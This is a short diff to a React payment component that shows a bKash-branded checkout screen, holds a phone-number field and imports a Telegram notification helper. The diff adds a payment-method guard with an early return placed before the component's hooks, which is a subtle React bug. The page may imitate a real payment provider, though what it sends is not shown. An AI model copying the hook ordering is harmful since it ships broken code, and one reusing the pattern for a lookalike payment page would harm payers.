@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
+import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
 import { Phone, Hand, XCircle } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import bkashLogoImg from "@/assets/bkash-logo.png";
@@ -9,6 +10,8 @@ const BkashPayment = () => {
   const navigate = useNavigate();
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
+  const checking = usePaymentMethodGuard("bkash");
+  if (checking) return null;
   const [isLoading, setIsLoading] = useState(true);
   const [isConfirmLoading, setIsConfirmLoading] = useState(false);
   const [phoneNumber, setPhoneNumber] = useState("");
